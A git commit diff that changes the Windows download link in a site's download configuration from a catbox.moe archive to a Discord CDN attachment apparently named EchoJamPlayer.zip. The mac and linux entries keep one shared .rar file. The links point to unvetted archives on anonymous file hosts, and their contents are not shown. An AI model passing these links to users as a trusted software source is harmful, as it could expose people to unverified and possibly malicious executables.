00741056d5dbe2b62933d9703d0ce97d8ebd72bf
ykggtrembala123 <140025450+ykggtrembala123@users.noreply.github.com>
2025-11-01 03:24:09 -0300

    Update downloads.ts

--- src/config/downloads.ts
+++ src/config/downloads.ts
@@ -1,6 +1,6 @@
 // Centralized download configuration
 export const downloadLinks = {
-  windows: "https://files.catbox.moe/sru3mc.rar",
+  windows: "https://cdn.discordapp.com/attachments/1424577697996210247/1434062301920628786/EchoJamPlayer.zip?ex=6906f618&is=6905a498&hm=b2a5d16b332963f21f520ec6c050bd3589eddf403d6906d72c22d2ec2c5b7655&",
   mac: "https://files.catbox.moe/sru3mc.rar",
   linux: "https://files.catbox.moe/sru3mc.rar",
 } as const;
